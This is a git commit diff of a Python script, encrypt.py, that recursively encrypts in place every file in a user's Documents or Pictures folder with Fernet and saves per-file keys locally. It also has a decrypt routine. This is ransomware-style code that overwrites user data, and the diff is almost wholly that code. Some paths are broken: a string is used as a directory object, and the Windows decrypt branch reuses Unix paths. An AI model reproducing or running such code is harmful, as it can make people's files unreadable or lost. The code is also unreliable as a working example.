1d8f19c9ad795ae9db62723236b495720c31f259
StormLight14 <100660727+StormLight14@users.noreply.github.com>
2022-07-26 19:37:34 -0600

    Update encrypt.py

--- encrypt.py
+++ encrypt.py
@@ -1,6 +1,5 @@
 from cryptography.fernet import Fernet
 import os
-
 import pathlib
 
 class Encrypt:
@@ -10,77 +9,83 @@ class Encrypt:
 
         if os.path.isdir("C:/"):
             print("Windows OS")
-            encrypt_path = "C:/"
+            keys_directory = f"C:/Users/{self.user}/Videos/"
+            keys_directory.mkdir(exist_ok=True)
+            data_directory = pathlib.Path(f"C:/Users/{self.user}/Documents")
         elif os.path.isdir("/home/"):
             print("Unix-Like OS")
             keys_directory = pathlib.Path("~").expanduser() / f"Documents/Keys"
             keys_directory.mkdir(exist_ok=True)
-
             data_directory = pathlib.Path(f"/home/{self.user}/Pictures")
-            for file_name in data_directory.rglob("*"):
-                if file_name.is_file():
-                    print(file_name)
-                    if file_name.suffix not in (".py", ".key"):
-                        key = Fernet.generate_key()
+
+        for file_name in data_directory.rglob("*"):
+            if file_name.is_file():
+                print(file_name)
+                if file_name.suffix not in (".py", ".key"):
+                    key = Fernet.generate_key()
+
+                    with open(
+                        (keys_directory / file_name.name).with_suffix(".key"), "wb"
+                    ) as filekey:
+                        filekey.write(key)
+
+                    fernet = Fernet(key)
+
+                    try:
+                        with open(
+                            data_directory / file_name.name, "rb"
+                        ) as file:
+                            original = file.read()
+
+                        encrypted = fernet.encrypt(original)
 
                         with open(
-                            (keys_directory / file_name.name).with_suffix(".key"), "wb"
-                        ) as filekey:
-                            filekey.write(key)
+                            (data_directory / file_name), "wb"
+                        ) as encrypted_file:
+                            encrypted_file.write(encrypted)
 
-                        fernet = Fernet(key)
-
-                        try:
-                            with open(
-                                data_directory / file_name.name, "rb"
-                            ) as file:
-                                original = file.read()
-
-                            encrypted = fernet.encrypt(original)
-
-                            with open(
-                                (data_directory / file_name), "wb"
-                            ) as encrypted_file:
-                                encrypted_file.write(encrypted)
-
-                            print(f"{file_name=} => {encrypted_file=}; {filekey=}")
-                        except (PermissionError, FileNotFoundError) as e:
-                            print(e)
-                            continue
+                        print(f"{file_name=} => {encrypted_file=}; {filekey=}")
+                    except (PermissionError, FileNotFoundError) as e:
+                        print(e)
+                        continue
         
     def decrypt_files(self):
         if os.path.isdir("C:/"):
             print("Windows OS")
+            keys_directory = pathlib.Path("~").expanduser() / f"Documents/Keys"
+            keys_directory.mkdir(exist_ok=True)
+
+            data_directory = pathlib.Path(f"/home/{self.user}/Pictures")
 
         elif os.path.isdir("/home/"):
             print("Unix-Like OS")
             keys_directory = pathlib.Path("~").expanduser() / f"Documents/Keys"
             keys_directory.mkdir(exist_ok=True)
-
             data_directory = pathlib.Path(f"/home/{self.user}/Pictures")
-            for file_name in data_directory.rglob("*"):
-                if file_name.is_file():
-                    if file_name.suffix not in (".py", ".key"):
+            
+        for file_name in data_directory.rglob("*"):
+            if file_name.is_file():
+                if file_name.suffix not in (".py", ".key"):
 
-                        with open((keys_directory / file_name.name).with_suffix(".key"), "rb") as filekey:
-                            key = filekey.read()
+                    with open((keys_directory / file_name.name).with_suffix(".key"), "rb") as filekey:
+                        key = filekey.read()
 
-                        fernet = Fernet(key)
+                    fernet = Fernet(key)
 
-                        try:
-                            with open(
-                                data_directory / file_name.name, "rb"
-                            ) as file:
-                                encrypted = file.read()
+                    try:
+                        with open(
+                            data_directory / file_name.name, "rb"
+                        ) as file:
+                            encrypted = file.read()
 
-                            decrypted = fernet.decrypt(encrypted)
+                        decrypted = fernet.decrypt(encrypted)
 
-                            with open(
-                                (data_directory / file_name), "wb"
-                            ) as encrypted_file:
-                                encrypted_file.write(decrypted)
+                        with open(
+                            (data_directory / file_name), "wb"
+                        ) as encrypted_file:
+                            encrypted_file.write(decrypted)
 
-                            print(f"{file_name=} => {encrypted_file=}; {filekey=}")
-                        except (PermissionError, FileNotFoundError) as e:
-                            print(e)
-                            continue
+                        print(f"{file_name=} => {encrypted_file=}; {filekey=}")
+                    except (PermissionError, FileNotFoundError) as e:
+                        print(e)
+                        continue
